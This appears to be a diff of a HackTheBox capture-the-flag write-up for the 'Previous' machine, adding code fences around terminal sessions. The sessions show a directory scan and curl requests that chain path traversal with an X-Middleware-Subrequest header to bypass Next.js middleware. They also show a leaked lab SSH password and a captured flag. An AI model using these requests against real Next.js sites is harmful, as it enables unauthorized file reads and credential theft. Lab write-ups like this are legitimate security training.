@@ -1,5 +1,5 @@
 1.
-# Challenge Writeup – [Challenge Name]
+# Challenge Writeup – [Previous]
 
 ## 📌 Challenge Details
 - **Category:** [FullPWn]
@@ -10,7 +10,8 @@
 
 ---
 ======================================================================================
-##┌──(sabeshan㉿kali)-[~]
+```bash
+┌──(sabeshan㉿kali)-[~]
 └─$ dirsearch -u http://previous.htb/api/auth/
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
@@ -38,8 +39,10 @@ Target: http://previous.htb/
 [07:47:35] 308 -   46B  - /api/auth/html/js/misc/swfupload//swfupload.swf  ->  /api/auth/html/js/misc/swfupload/swfupload.swf
 [07:48:22] 200 -    2B  - /api/auth/session                                 
 [07:48:24] 302 -    0B  - /api/auth/signin  ->  /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000
-[07:48:25] 200 -    5KB - /api/auth/signout 
+[07:48:25] 200 -    5KB - /api/auth/signout
+```
 ===========================================================================================================
+```bash
 ┌──(sabeshan㉿kali)-[~]
 └─$ curl "http://previous.htb/api/download?example=../../../../../../../app/.next/routes-manifest.json" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" -s | jq
 
@@ -139,7 +142,9 @@ Target: http://previous.htb/
   },
   "rewrites": []
 }
+```
 ================================================================================================================
+```bash
 ──(sabeshan㉿kali)-[~]
 └─$ curl "http://previous.htb/api/download?example=../../../../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"        
 "use strict";
@@ -156,7 +161,9 @@ pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-aut
 A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},
 userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
 |-----> ssh creds ->jeremy:MyNameIsJeremyAndILovePancakes
+```
 =========================================================================================================================
+```
 ┌──(sabeshan㉿kali)-[~]
 └─$ cd HTB/Previous
                                                                                                                                                              
@@ -199,8 +206,10 @@ func main() {
 }
                                                                                                                                                              
 ┌──(sabeshan㉿kali)-[~/HTB/Previous]
-└─$ 
+└─$
+```
 ======================================================================================================================
+```
 jeremy@previous:~$ sudo -l
 [sudo] password for jeremy: 
 Matching Defaults entries for jeremy on previous:
@@ -364,3 +373,4 @@ jeremy@previous:~$ cat user.txt
 4d3278a4d340781344ce75f57aa54937
 jeremy@previous:~$ 
 ======================================================================================
+```
